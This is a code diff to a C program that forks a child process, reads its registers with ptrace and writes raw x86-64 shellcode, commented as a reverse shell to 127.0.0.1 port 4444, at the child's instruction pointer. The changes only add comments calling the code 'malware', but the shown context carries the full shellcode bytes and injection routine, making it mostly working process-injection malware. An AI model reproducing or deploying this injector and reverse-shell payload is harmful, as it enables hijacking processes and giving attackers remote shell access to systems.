@@ -13,7 +13,7 @@ int injecting_shell(pid_t pid, unsigned char *src, void *dst, int len);
 
 int main(int argc, char **argv){
     
-    unsigned char *payload = (unsigned char*)
+    unsigned char *payload = (unsigned char*) // reverse shell 127.0.0.1, 4444
 
         "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
         "\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6"
@@ -25,7 +25,8 @@ int main(int argc, char **argv){
     size_t payload_size = strlen((char*)payload);
     pid_t pid; 
     int status;
-
+    
+// spawn a child process
     pid = fork();
 
     if (pid == -1){
@@ -51,7 +52,7 @@ int main(int argc, char **argv){
             perror("Child has not stopped");
             exit(-1);
         }
-
+        // get the registers, we need to get the RIP(instruction pointer) so our malware can run there
         struct user_regs_struct regs;
 
         printf("Got registers\n");
@@ -65,6 +66,7 @@ int main(int argc, char **argv){
         printf("RSI: %llx\n", (unsigned long long) regs.rsi);
         printf("RIP: %llx\n", (unsigned long long) regs.rip);
 
+        //injecting shell code at the RIP
         printf("[+] Injecting shell code at:%p[+]\n",(void*)regs.rip);
         injecting_shell(pid, payload,(void*)regs.rip, payload_size);
         
@@ -97,7 +99,7 @@ int main(int argc, char **argv){
 
     return 0;
 }
-
+//function to define the malware
 int injecting_shell(pid_t pid, unsigned char *src, void *dst, int len){
     unsigned long long *s = (unsigned long long *) src;
     unsigned long long *d = (unsigned long long *) dst;
